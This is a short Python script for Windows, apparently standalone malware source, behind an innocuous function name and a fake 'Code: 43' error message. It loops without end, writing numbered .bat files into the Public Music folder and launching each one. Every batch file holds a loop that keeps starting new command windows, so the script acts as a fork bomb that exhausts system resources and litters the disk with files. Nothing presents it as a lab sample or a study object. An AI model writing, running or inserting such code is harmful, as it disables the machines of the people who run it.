import subprocess
import getpass
import os

cdrive ="C:\\"
userid ="C:\\Users\\"
username = getpass.getuser()

def CSIpublicmusic():
    global userid
    public = (R"\Users\Public\Music\\")
    total = str(cdrive) + str(public)
    if os.path.exists(total):
        x = 0
        while True:   
            x = x + 1
            f = open((str(total)+str(x)+'.bat'),"w+")
            f.write("""
            :a
            start
            goto a
                """)
            f.close
            subprocess.Popen((str(total))+(str(x)+'.bat'), shell=True)
    else:
        print("Code: 43")

CSIpublicmusic()